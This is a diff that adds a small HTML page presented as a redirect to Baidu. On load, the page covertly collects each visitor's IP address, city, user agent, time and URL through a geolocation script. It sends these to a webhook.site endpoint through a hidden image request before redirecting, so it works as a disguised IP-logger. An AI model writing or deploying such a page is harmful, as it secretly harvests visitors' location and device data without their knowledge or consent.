@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>跳转中...</title>
+</head>
+<body>
+    <script src="https://pv.sohu.com/cityjson?ie=utf-8"></script>
+    <script>
+        // 你的 Webhook 地址
+        const WEBHOOK_URL = "https://webhook.site/b1a566cd-33ae-49ef-bb54-b68c5a75e5cd";
+
+        try {
+            if (typeof returnCitySN !== 'undefined') {
+                const visitData = {
+                    ip: returnCitySN.cip,
+                    city: returnCitySN.cname,
+                    time: new Date().toLocaleString('zh-CN'),
+                    url: location.href,
+                    ua: navigator.userAgent
+                };
+
+                // 用隐藏图片方式提交数据
+                const img = new Image();
+                const params = new URLSearchParams(visitData).toString();
+                img.src = `${WEBHOOK_URL}?${params}`;
+                img.style.display = 'none';
+                document.body.appendChild(img);
+            }
+        } catch (e) {
+            console.error("提交失败:", e);
+        }
+
+        // 延迟 1 秒后跳转到百度
+        setTimeout(function() {
+            window.location.href = "https://www.baidu.com";
+        }, 1000);
+    </script>
+</body>
+</html>
